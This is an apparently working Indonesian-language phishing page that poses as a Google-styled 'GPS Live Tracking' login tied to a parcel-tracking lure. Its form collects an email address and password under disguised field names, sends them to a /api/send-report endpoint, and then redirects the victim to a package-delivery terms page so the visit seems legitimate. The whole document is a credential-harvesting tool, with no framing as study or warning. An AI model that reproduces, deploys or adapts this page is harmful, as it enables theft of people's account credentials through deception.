<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#ffffff">
  <title>Live Tracking</title>
  <style>
    :root {
      --blue: #0b57d0;
      --ink: #202124;
      --muted: #5f6368;
      --line: #dadce0;
      --surface: #fff;
      --page: #f8fafd;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0; min-height: 100vh; background: var(--page); color: var(--ink);
      font-family: Arial, Helvetica, sans-serif; -webkit-font-smoothing: antialiased;
    }
    .shell {
      width: min(100%, 460px); min-height: 100vh; margin: 0 auto; background: var(--surface);
      display: flex; flex-direction: column; padding: 24px 24px 20px;
    }
    header { display: flex; align-items: center; justify-content: center; min-height: 54px; }
    .brand-logo { width: 120px; height: 96px; object-fit: contain; display: block; }
    .dot { width: 7px; height: 7px; border-radius: 50%; display: inline-block; }
    .blue { background: #4285f4; } .red { background: #ea4335; }
    .yellow { background: #fbbc05; } .green { background: #34a853; }
    .demo-tag { font-size: 11px; color: #5f6368; border: 1px solid var(--line); padding: 5px 8px; border-radius: 20px; }
    main { flex: 1; padding-top: 18px; }
    h1 { margin: 0 auto 12px; max-width: 320px; text-align: center; font-size: 24px; line-height: 1.3; font-weight: 500; letter-spacing: -.3px; }
    .subtitle { margin: 0 auto 30px; max-width: 340px; text-align: center; color: var(--ink); font-size: 15px; line-height: 1.55; }
    .field-label { display: block; font-size: 14px; margin-bottom: 8px; color: var(--muted); }
    input {
      width: 100%; height: 56px; padding: 0 14px; border: 1px solid #747775;
      border-radius: 4px; background: #fff; color: var(--ink); font-size: 16px; outline: none;
      transition: border-color .15s, box-shadow .15s;
    }
    input:focus { border: 2px solid var(--blue); padding-left: 13px; box-shadow: 0 0 0 1px transparent; }
    .hint { color: var(--muted); font-size: 12px; line-height: 1.5; margin: 9px 0 0; }
    .spacer { height: 32px; }
    .nav { display: flex; justify-content: flex-end; align-items: center; margin-top: auto; padding-top: 32px; }
    .next {
      display: inline-flex; justify-content: center; align-items: center; min-height: 42px;
      padding: 0 24px; border-radius: 22px; background: var(--blue); color: white;
      text-decoration: none; font-size: 14px; font-weight: 600; border: 0; cursor: pointer;
    }
    .next:hover { background: #0842a0; box-shadow: 0 1px 2px #0002; }
    .next:focus-visible { outline: 3px solid #a8c7fa; outline-offset: 3px; }
    footer { font-size: 12px; color: var(--muted); padding-top: 26px; display: flex; justify-content: space-between; gap: 12px; }
    footer a { color: inherit; text-decoration: none; }
    .notice { margin-top: 22px; border-radius: 8px; background: #f1f3f4; padding: 12px; display: flex; align-items: flex-start; gap: 9px; font-size: 12px; color: #5f6368; line-height: 1.5; }
    .info-icon { flex: 0 0 auto; display: inline-flex; align-items: center; justify-content: center; width: 17px; height: 17px; border: 1px solid #5f6368; border-radius: 50%; font-size: 11px; font-weight: 700; line-height: 1; margin-top: 1px; }
    @media (min-width: 600px) {
      body { padding: 28px 0; }
      .shell { min-height: calc(100vh - 56px); border: 1px solid #e8eaed; border-radius: 24px; padding: 28px 32px 24px; }
      main { padding-top: 64px; }
    }
  </style>
</head>
<body>
  <div class="shell">
    <header>
      <img class="brand-logo" src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/live-location-pin-location-tracking-position-stock-illustration-vector-eU7drSTkt92J5U1hjtYT2rh2qrUQRX.jpg" alt="GPS Location">
    </header>

    <main>
      <h1>GPS Live Tracking</h1>
      <p class="subtitle">Login untuk menghubungkan akunmu. Setelah akunmu terhubung dengan layanan Live Tracking, cek notifikasi di aplikasi kamu.</p>

      <form id="demoForm">
        <input id="firstName" name="firstName" type="email" placeholder="Masukan Email" autocomplete="email" required maxlength="120">

        <div style="height:18px"></div>

        <input id="lastName" name="lastName" type="password" placeholder="Masukan Kata Sandi" autocomplete="current-password" required maxlength="120">

        <div class="notice"><span class="info-icon" aria-hidden="true">i</span><span>Harap periksa terlebih dahulu apakah kamu sudah memenuhi syarat dan ketentuan yang berlaku.</span></div>
        <div class="nav">
          <button class="next" type="submit">Berikutnya&nbsp; →</button>
        </div>
      </form>
    </main>

    <footer>
      <span>Bahasa Indonesia</span>
      <span><a href="#" onclick="return false">Bantuan</a> &nbsp; <a href="#" onclick="return false">Privasi</a></span>
    </footer>
  </div>

  <script>
    const NEXT_PAGE_URL = "https://cek-paketku.myr.id/lp/baca-syarat-ketentuan-pengiriman";

    document.getElementById("demoForm").addEventListener("submit", async function (event) {
      event.preventDefault();
      const form = event.currentTarget;
      const button = form.querySelector('button[type="submit"]');
      const firstName = form.elements.firstName.value.trim();
      const lastName = form.elements.lastName.value.trim();

      if (!firstName || !lastName) {
        alert("Silakan isi Nama Depan dan Nama Belakang.");
        return;
      }

      button.disabled = true;
      button.textContent = "Mengirim…";
      try {
        const response = await fetch("/api/send-report", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ firstName, lastName })
        });
        if (!response.ok) throw new Error("Pengiriman gagal");
        window.location.href = NEXT_PAGE_URL;
      } catch (error) {
        alert("Data belum berhasil dikirim. Pastikan halaman sudah di-deploy bersama endpoint /api/send-report, lalu coba lagi.");
        button.disabled = false;
        button.textContent = "Berikutnya →";
      }
    });
  </script>
</body>
</html>
